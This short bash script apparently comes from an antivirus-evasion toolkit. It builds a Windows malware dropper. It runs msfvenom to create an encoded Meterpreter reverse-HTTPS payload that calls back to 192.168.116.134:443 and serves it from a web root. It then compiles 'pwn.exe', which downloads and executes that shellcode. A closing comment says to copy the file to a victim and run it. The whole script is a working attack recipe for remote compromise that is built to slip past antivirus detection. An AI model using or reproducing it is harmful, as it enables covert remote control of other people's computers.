#!/bin/bash          
# simple example script for building the .exe file
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter reverse payload, encoded with shikata_ga_nai
# create payload in /var/www/html
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.134 lport=443 -e x86/shikata_ga_nai -b '\x00' -f raw -a x86 --platform Windows > /var/www/html/sc.bin
# config for downloading and exec shellcode
./make_avet -d sock -p
# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c -lwsock32 -lWs2_32
# cleanup
echo "" > defs.h
# now copy pwn.exe to victim and exec like: pwn http://yourserver/sc.bin
